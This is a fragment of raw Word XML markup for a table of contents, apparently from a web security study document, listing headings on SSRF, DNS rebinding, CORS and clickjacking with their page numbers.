              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408581 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>31</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="37D04C57" w14:textId="209F3D91" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408582" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Server-Side Request Forgery (SSRF)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408582 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>32</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="4D0D6D03" w14:textId="47FA8B29" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408583" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Why it exists:</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408583 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>32</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="171BE9E7" w14:textId="748C61CB" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408584" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Normal Workflow:</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408584 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>32</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="24E90648" w14:textId="6EE81874" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408585" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>SSRF Vulnerability:</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408585 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>32</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="1AA2B6F3" w14:textId="4E744A33" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408586" w:history="1">
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408586 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>33</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="6F5143FE" w14:textId="27085E1F" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408587" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>How SSRF is triggered:</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408587 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>33</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="1BAA5E90" w14:textId="7DD90CA4" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408588" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Types of SSRF</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408588 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>33</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="71FA7461" w14:textId="0B76CE04" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408589" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Bypasses</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408589 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>33</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="304FA4AD" w14:textId="4FC7C059" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408590" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Chaining SSRF</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408590 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>34</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="7A6D48DA" w14:textId="36071A3B" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408591" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>DNS Rebinding</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408591 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>34</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="4D90C263" w14:textId="395A6DBC" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408592" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>CORS (Cross-Origin Resource Sharing)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408592 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>34</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="457E3F15" w14:textId="29762001" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408593" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Threat model</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408593 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>34</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="1746F0C8" w14:textId="00749955" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408594" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Recon – What to check</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408594 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>34</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="178FEE91" w14:textId="5336D1AF" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408595" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Exploitable patterns &amp; payloads</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408595 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>35</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="07BFF637" w14:textId="062239FF" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408596" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Defensive checklist</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408596 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>35</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="6A553EAC" w14:textId="274B6CB1" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408597" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Clickjacking (UI Redress Attack)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408597 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>36</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
